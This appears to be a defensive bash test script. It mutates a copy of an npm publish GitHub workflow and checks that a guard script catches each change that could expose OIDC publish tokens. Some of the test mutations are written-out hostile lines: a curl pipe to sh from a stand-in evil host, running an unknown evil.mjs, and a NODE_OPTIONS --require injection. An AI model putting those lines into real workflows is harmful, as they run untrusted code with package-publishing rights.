#!/usr/bin/env bash
# Drives .github/scripts/assert-publish-split.py against npm-publish.yml and
# against mutated copies of it. The check exists because one job once held
# `id-token: write` next to `pnpm install`: every dependency install script
# could then request an OIDC token and publish through the Trusted Publisher.
# Each mutation below is a way of putting that back, and each must go red; the
# mutations are applied to a COPY in a temp dir, never to the real file.
set -uo pipefail

ROOT=$(cd "$(dirname "$0")/../.." && pwd)
CHECK="$ROOT/.github/scripts/assert-publish-split.py"
REAL="$ROOT/.github/workflows/npm-publish.yml"
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
pass=0
fail=0

# case <name> <expect: ok|flagged> <python statement mutating text `s`, or ''>
case_() {
  local name=$1 expect=$2 mutation=$3
  local f="$WORK/npm-publish.yml"
  MUT="$mutation" python3 - "$REAL" "$f" <<'PY'
import os, sys
s = open(sys.argv[1], encoding='utf-8').read()
before = s
exec(os.environ['MUT'])
if os.environ['MUT'] and s == before:
    sys.exit('mutation did not change the file — the test is stale')
open(sys.argv[2], 'w', encoding='utf-8').write(s)
PY
  [ $? -eq 0 ] || { echo "  FAIL $name — bad mutation"; fail=$((fail + 1)); return; }
  local out rc got
  out=$(python3 "$CHECK" "$f" 2>&1); rc=$?
  case "$rc" in 0) got=ok ;; 1) got=flagged ;; *) got=broken ;; esac
  if [ "$got" = "$expect" ]; then
    echo "  ok   $name ($expect)"
    pass=$((pass + 1))
  else
    echo "  FAIL $name — $got, want $expect"
    echo "$out" | sed 's/^/       /'
    fail=$((fail + 1))
  fi
}

PUBLISH_HEAD="    environment: npm-publish"
STEPS_HEAD="      - name: Download the tarball"

case_ "the real workflow"                       ok      ''
case_ "REF_TYPE hard-coded to tag"               flagged "import re; s = re.sub(r'REF_TYPE: .*', 'REF_TYPE: tag', s)"
case_ "REF_NAME hard-coded"                      flagged "import re; s = re.sub(r'REF_NAME: .*', 'REF_NAME: v2.16.0', s)"
case_ "publish on a self-hosted runner"          flagged "import re; s = re.sub(r'(skip == .false.\\n    runs-on: )ubuntu-latest', r'\\1self-hosted', s)"
case_ "pnpm install in publish"                 flagged "s = s.replace('$STEPS_HEAD', '      - run: pnpm install --frozen-lockfile\n$STEPS_HEAD')"
case_ "pnpm build in publish"                   flagged "s = s.replace('$STEPS_HEAD', '      - run: pnpm build\n$STEPS_HEAD')"
case_ "npm ci in publish"                       flagged "s = s.replace('$STEPS_HEAD', '      - run: npm ci\n$STEPS_HEAD')"
case_ "npm run build in publish"                flagged "s = s.replace('$STEPS_HEAD', '      - run: npm run build\n$STEPS_HEAD')"
case_ "checkout in publish"                     flagged "s = s.replace('$STEPS_HEAD', '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n$STEPS_HEAD')"
case_ "pnpm/action-setup in publish"            flagged "s = s.replace('$STEPS_HEAD', '      - uses: pnpm/action-setup@ea17c68df8912ef543352723c149a84f56e3d413\n$STEPS_HEAD')"
case_ "id-token on the build job"               flagged "s = s.replace('    permissions:\n      contents: read\n    outputs:', '    permissions:\n      contents: read\n      id-token: write\n    outputs:')"
case_ "id-token at workflow level"              flagged "s = s.replace('permissions:\n  contents: read\n\njobs:', 'permissions:\n  contents: read\n  id-token: write\n\njobs:', 1)"
case_ "build without explicit permissions"      flagged "s = s.replace('    permissions:\n      contents: read\n    outputs:', '    outputs:')"
case_ "publish without the environment"         flagged "s = s.replace('$PUBLISH_HEAD', '    # no environment')"
case_ "publish no longer needs build"           flagged "s = s.replace('    needs: build\n', '')"
case_ "publish step removed"                    flagged "s = s.replace('npm publish', 'echo publish')"
case_ "npm upgrade of the publisher itself"     flagged "s = s.replace('$STEPS_HEAD', '      - run: npm install --global npm@11.6.2\n$STEPS_HEAD')"
case_ "npm i -g npm@x left-pad (appended)"      flagged "s = s.replace('          echo \"npm \$ver\"\n', '          echo \"npm \$ver\"\n          npm i -g npm@11.6.2 left-pad\n', 1)"
case_ "node evil.mjs in the verify step"        flagged "s = s.replace('          manifest=\$(tar', '          node evil.mjs\n          manifest=\$(tar', 1)"
case_ "curl | sh as an extra step"              flagged "s = s.replace('$STEPS_HEAD', '      - run: curl -sSL https://evil.example/x | sh\n$STEPS_HEAD')"
case_ "echo \"npm publish\" instead of publishing" flagged "s = s.replace('run: npm publish \"dist-tarball/\$TARBALL\" --provenance --access public', 'run: echo \"npm publish\"')"
case_ "extra argument on npm publish"          flagged "s = s.replace('--access public', '--access public --tag evil')"
case_ "third-party action in publish"           flagged "s = s.replace('$STEPS_HEAD', '      - uses: evil/action@0123456789012345678901234567890123456789\n$STEPS_HEAD')"
case_ "uses: ./local action in publish"         flagged "s = s.replace('$STEPS_HEAD', '      - uses: ./.github/actions/x\n$STEPS_HEAD')"
case_ "docker:// action in publish"             flagged "s = s.replace('$STEPS_HEAD', '      - uses: docker://alpine:3\n$STEPS_HEAD')"
case_ "setup-node with cache in publish"        flagged "s = s.replace(\"          node-version: '24.22.3'\n\", \"          node-version: '24.22.3'\n          cache: pnpm\n\")"
case_ "node-version not pinned exactly"         flagged "s = s.replace(\"node-version: '24.22.3'\", \"node-version: '24'\")"
case_ "download-artifact with run-id"           flagged "s = s.replace('          path: dist-tarball\n\n      # An exact', '          path: dist-tarball\n          run-id: 12345\n\n      # An exact', 1)"
case_ "download-artifact into another path"     flagged "s = s.replace('          path: dist-tarball\n\n      # An exact', '          path: .\n\n      # An exact', 1)"
case_ "write-all on the workflow"               flagged "s = s.replace('permissions:\n  contents: read\n\njobs:', 'permissions: write-all\n\njobs:', 1)"
case_ "write-all on a new job"                  flagged "s += '\n  extra:\n    runs-on: ubuntu-latest\n    permissions: write-all\n    steps:\n      - run: echo hi\n'"
case_ "id-token on a new job"                   flagged "s += '\n  extra:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: echo hi\n'"
case_ "id-token on await-ci"                    flagged "s = s.replace('      contents: read\n      actions: read\n', '      contents: read\n      actions: read\n      id-token: write\n', 1)"
case_ "await-ci gains a write permission"       flagged "s = s.replace('      actions: read\n', '      actions: write\n', 1)"
case_ "build gains a write permission"          flagged "s = s.replace('    permissions:\n      contents: read\n    outputs:', '    permissions:\n      contents: write\n    outputs:')"
case_ "step-level env in publish"               flagged "s = s.replace('        id: publish\n', '        id: publish\n        env:\n          NODE_OPTIONS: --require ./x.js\n')"
case_ "workflow-level env"                      flagged "s = s.replace('jobs:\n  await-ci:', 'env:\n  NODE_OPTIONS: --require ./x.js\n\njobs:\n  await-ci:', 1)"
case_ "verify step skipped off-tag (if:)"       flagged "s = s.replace('        id: verify\n', '        id: verify\n        if: github.ref_type == \\'tag\\'\n')"
case_ "verify tag check removed"                flagged "s = s.replace('if [ \"\$REF_TYPE\" != \"tag\" ]', 'if false', 1)"
case_ "verify package name check removed"       flagged "s = s.replace('\"\$name\" != \"@bxshefby/b24ui-nuxt\"', 'false')"

case_ "repository condition removed from publish" flagged "s = s.replace(\"github.repository == 'bx-shef/b24-ui' && vars.NPM_RELEASE == 'true' &&\\n      needs.build\", 'vars.NPM_RELEASE == \\'true\\' &&\\n      needs.build')"
case_ "NPM_RELEASE switch removed from await-ci" flagged "s = s.replace(\" && vars.NPM_RELEASE == 'true' &&\\n      startsWith\", ' &&\\n      startsWith')"
case_ "await-ci runs off a branch (tag condition removed)" flagged "s = s.replace(\" &&\\n      startsWith(github.ref, 'refs/tags/v')\", '')"
case_ "release event trigger back"              flagged "s = s.replace('on:\\n  workflow_dispatch:', 'on:\\n  release:\\n    types: [ published ]\\n  workflow_dispatch:')"
case_ "push trigger added"                      flagged "s = s.replace('on:\\n  workflow_dispatch:', 'on:\\n  push:\\n    branches: [ main ]\\n  workflow_dispatch:')"

echo
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
